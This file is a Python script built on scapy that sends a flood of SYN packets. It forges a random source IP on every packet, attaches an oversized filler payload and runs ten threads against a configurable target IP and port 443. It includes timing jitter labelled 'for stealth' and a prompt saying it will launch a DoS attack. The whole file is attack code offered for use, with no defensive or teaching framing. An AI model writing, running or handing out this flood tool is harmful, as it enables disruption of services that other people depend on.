from scapy.all import *
import threading
import time
import random
import sys

TARGET_IP = "0.0.0.0"
TARGET_PORT = 443

PAYLOAD = (
    b"\x41" * 60000 +
    b"\x00\x00\x00\x00" +
    b"\xFF" * 5000
)

def craft_packet():
    ip = IP(
        src=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        dst=TARGET_IP,
    )
    tcp = TCP(
        sport=random.randint(1024, 65535),
        dport=TARGET_PORT,
        flags="S",
    )
    return ip / tcp / PAYLOAD

def send_exploit_loop():
    while True:
        packet = craft_packet()
        send(packet, verbose=0)
        time.sleep(random.uniform(0.05, 0.15))  # Random delay for stealth

def main():
    print(f"Target: {TARGET_IP}:{TARGET_PORT}")
    confirm = input("⚠️ This will launch a DoS attack. Proceed? (yes/no): ").lower()
    if confirm != 'yes':
        print("Aborted.")
        sys.exit(0)

    threads = []
    for _ in range(10):  # Number of concurrent threads - tune accordingly
        t = threading.Thread(target=send_exploit_loop)
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopped by user.")

if __name__ == "__main__":
    main()
